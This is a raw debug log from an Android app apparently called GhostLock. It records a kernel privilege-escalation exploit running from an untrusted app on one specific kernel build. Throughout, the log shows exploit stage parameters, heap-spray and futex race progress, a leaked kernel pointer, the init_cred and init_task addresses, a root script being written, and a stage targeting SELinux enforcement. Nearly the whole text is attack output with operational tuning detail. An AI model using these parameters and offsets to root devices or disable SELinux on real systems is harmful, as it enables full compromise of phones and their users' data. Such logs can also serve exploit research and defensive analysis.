<k> GhostLock 1.2+563 build 2026-10-03 15:44:16
<k> debug log: Download/ghostlock-debug-log/20261003-172124/ghostlock-direct-0.log
<k> debug dump dir: /storage/emulated/0/Download/ghostlock-debug-log/20261003-172124
<k> ksud ready
<k> profile: hasProfile=true invalid=0 release=6.12.58-android16-6-gff10eaa8f8a4-ab15575650-4k
<k> runtime profile written: profile.conf/profile.bin
<b> starting native: /data/app/~~A3z2eCp4JzKAi5zh9ztu0Q==/com.ghostlock.app-SyrY3UDyOCy21Op7corLcg==/lib/arm64/libghostlock.so
[33m[*] [0mkernel: 6.12.58-android16-6-gff10eaa8f8a4-ab15575650-4k
[32m[+] [0mresolved profile loaded: 6.12.58-android16-6-gff10eaa8f8a4-ab15575650-4k
[33m[*] [0mcpu pair: main=0 consumer=1
[33m[*] [0mruntime home=/data/user/0/com.ghostlock.app/files script=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mdebug.execution.begin release=6.12.58-android16-6-gff10eaa8f8a4-ab15575650-4k
[33m[*] [0mdebug.execution.recommended_cpus.main=0
[33m[*] [0mdebug.execution.recommended_cpus.consumer=1
[33m[*] [0mdebug.execution.selected_cpus.main=0
[33m[*] [0mdebug.execution.selected_cpus.consumer=1
[33m[*] [0mdebug.execution.heap.prepare_max_attempts=4
[33m[*] [0mdebug.execution.heap.prepare_timeout_ms=240000
[33m[*] [0mdebug.execution.heap.kernelsnitch_timeout_ms=60000
[33m[*] [0mdebug.execution.race.route_wait_ms=1000
[33m[*] [0mdebug.execution.race.setup_settle_us=50000
[33m[*] [0mdebug.execution.race.state_poll_interval_us=1000
[33m[*] [0mdebug.execution.stages.w1_attempts=15
[33m[*] [0mdebug.execution.stages.w1_settle_us=100000
[33m[*] [0mdebug.execution.stages.w1_scratch_repair_attempts=3
[33m[*] [0mdebug.execution.stages.w2_attempts=15
[33m[*] [0mdebug.execution.stages.w2_settle_us=100000
[33m[*] [0mdebug.execution.stages.w3_chain_rounds=3
[33m[*] [0mdebug.execution.stages.w3_attempts=6
[33m[*] [0mdebug.execution.stages.w3_settle_us=50000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.attempts=0
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.arm_sequence=0
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=0
[33m[*] [0mdebug.execution.routes.select_stack.enter_delay_us=0
[33m[*] [0mdebug.execution.routes.select_stack.timeout_us=0
[33m[*] [0mdebug.execution.routes.select_stack.consumer_max_calls=1
[33m[*] [0mdebug.execution.routes.select_stack.consumer_burst_calls=1
[33m[*] [0mdebug.execution.handoff.pre_dispatch_settle_ms=2000
[33m[*] [0mdebug.execution.handoff.module_poll_attempts=30
[33m[*] [0mdebug.execution.handoff.module_poll_interval_ms=100
[33m[*] [0mdebug.execution.handoff.enforce_poll_attempts=200
[33m[*] [0mdebug.execution.handoff.enforce_poll_interval_ms=100
[33m[*] [0mdebug.execution.end
[33m[*] [0msoc: mtk; kernel_phys_load=0x80000000
[33m[*] [0minit_cred image=ffffffc082553830 alias=ffffff8002553830
[33m[*] [0mroot script written path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh bytes=6200
[33m[*] [0miomem cache: no usable dump, keeping the built-in geometry
[32m[+] [0mstartup context pid=11660 uid=10528 euid=10528 gid=10528 egid=10528 boot_ms=42853 attr=u:r:untrusted_app:s0:c16,c258,c512,c768 enforce=unreadable
[32m[+] [0mstartup limits pid=11660 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
[32m[+] [0mbuild config pid=11660 label=ghostlock_oplus slide=pselect main=pselect
[32m[+] [0mp0 profile pid=11660 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff80025321b0 bootid_data=ffffff80027e8d48 init_task=ffffff800253dac0 root_tg=ffffff80027778c0 sysctl_bootid=ffffff80027e8d48
[33m[*] [0mp0 kernel_phys_load=0000000080000000 delta=0000000000000000
[33m[*] [0mmain thread running on cpu=0
[33m[*] [0m[T+0ms] exploit start
[31m[-] [0mSELinux enforce unreadable; assuming enforcing and running W1
[33m[*] [0m[T+1ms] pre-W1 drain
[33m[*] [0mW1: SELinux attempt 1/15
[33m[*] [0m=== W1: SELinux === target=0xffffff80027c6960 mode=1 leaf=0
[33m[*] [0m[T+243ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +133ms
[33m[*] [0m[spray] finding futex collisions... +463ms
[33m[*] [0m[spray] early collision screen 6/3 at 37%
[33m[*] [0m[spray] futex collisions found +1050ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff809c4b1e00 +1096ms
[33m[*] [0m[spray] payload ready +1098ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +1151ms
[33m[*] [0m[T+1394ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mfd_graph route geometry: eventpoll_size=208 epitem_ep=72 epitem_fllink=80 pipe_buffer=40 pipe_flags=24 pipe_slots=32 pipe_ring=1280 pipe_object=2048 graph_width=96 graph_fanout=256 graph_edges=24576 objects_per_order3=16
[33m[*] [0mfd_graph: reclaim_small complete fds=240
[33m[*] [0mfd_graph: drain_small complete fds=240
[33m[*] [0m[spray] early collision screen 2/1 at 50%
[33m[*] [0mfd_graph: collision page found at 0000000000000002
[33m[*] [0mfd_graph: drain_expand complete fds=240 page=0000000000000002
[33m[*] [0mfd_graph: reclaim_expand complete fds=240
[33m[*] [0mfd_graph: RACE_SUMMARY tries=10 reclaim_hits=10 chain_hits=0 bit4_hits=0
